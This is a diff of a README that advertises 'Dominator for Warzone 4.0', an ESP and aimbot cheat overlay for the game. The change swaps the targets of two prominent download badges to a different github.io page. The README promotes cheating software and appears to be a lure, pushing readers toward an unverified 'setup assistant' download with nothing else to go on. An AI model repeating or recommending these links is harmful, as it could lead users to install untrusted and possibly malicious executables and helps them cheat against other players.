@@ -1,7 +1,7 @@
 # 🛡️ Dominator for Warzone 4.0 — ESP + Aimbot Visual Overlay Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://dominator-for-warzone-4-0.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://dominator-for-warzone-4-0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://budschinner40.github.io/.github/dominator-warzone-4)  
+[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://budschinner40.github.io/.github/dominator-warzone-4)
 
 ---
 
